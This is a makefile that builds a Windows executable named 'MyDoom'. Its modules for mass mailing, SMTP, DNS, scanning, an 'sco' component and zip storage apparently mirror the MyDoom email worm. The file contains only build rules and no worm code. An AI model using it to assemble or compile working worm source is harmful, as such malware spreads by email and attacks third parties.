CXX = g++
CXXFLAGS = -O3 -std=c++23
OBJS = main.o lib.o massmail.o msg.o scan.o sco.o xdns.o xsmtp.o zipstore.o
LIBS = -lws2_32 -luser32 -lkernel32 -ladvapi32 -lmsvcrt6
EXE = MyDoom

all: $(EXE)

$(EXE): $(OBJS) makefile
	$(CXX) $(CXXFLAGS) $(OBJS) -o $(EXE) $(LIBS)

main.o: main.cpp lib.hpp massmail.hpp msg.hpp scan.hpp sco.hpp xdns.hpp xsmtp.hpp zipstore.hpp
	$(CXX) $(CXXFLAGS) -c main.cpp -o main.o

lib.o: lib.hpp
	$(CXX) $(CXXFLAGS) -c lib.hpp -o lib.o

massmail.o: massmail.hpp
	$(CXX) $(CXXFLAGS) -c massmail.hpp -o massmail.o

msg.o: msg.hpp
	$(CXX) $(CXXFLAGS) -c msg.hpp -o msg.o

scan.o: scan.hpp
	$(CXX) $(CXXFLAGS) -c scan.hpp -o scan.o

sco.o: sco.hpp
	$(CXX) $(CXXFLAGS) -c sco.hpp -o sco.o

xdns.o: xdns.hpp
	$(CXX) $(CXXFLAGS) -c xdns.hpp -o xdns.o

xsmtp.o: xsmtp.hpp
	$(CXX) $(CXXFLAGS) -c xsmtp.hpp -o xsmtp.o

zipstore.o: zipstore.hpp
	$(CXX) $(CXXFLAGS) -c zipstore.hpp -o zipstore.o

clean:
	rm -f $(OBJS) $(EXE)
